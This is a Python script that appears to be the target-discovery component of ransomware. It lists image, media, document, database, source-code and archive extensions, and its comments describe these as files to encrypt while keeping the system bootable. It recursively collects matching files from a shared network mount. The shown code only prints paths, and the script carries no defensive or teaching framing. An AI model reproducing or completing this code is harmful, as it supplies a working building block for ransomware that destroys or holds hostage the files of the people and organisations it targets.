#!/usr/bin/python3
import os

global_ext = [
    # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', 'JPG', 'JPEG', 'NEF', # images
    'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies
    'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv', # structured data
    'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images
    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
    'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
    'java', 'class', 'jar', # java source code
    'ps', 'bat', 'vb', # windows based scripts
    'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
    'go', 'py', 'pyc', 'bf', 'coffee', # other source code files
    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
]

def discoverFiles(startpath, extensions=global_ext):
    # This is a file extension list of all files that may want to be encrypted.
    # They are grouped by category. If a category is not wanted, Comment that line.
    # All files uncommented by default should be harmless to the system
    # that is: Encrypting all files of all the below types should leave a system in a bootable state,
    # BUT applications which depend on such resources may become broken.
    # This will not cover all files, but it should be a decent range.
    for dirpath, dirs, files in os.walk(startpath):
        for i in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, i))
            ext = absolute_path.split('.')[-1]
            if ext in extensions and not os.path.islink(absolute_path):
                yield absolute_path

if __name__ == "__main__":
    x = discoverFiles('/mnt/nfs_shared/')
    for i in x:
        print(i)
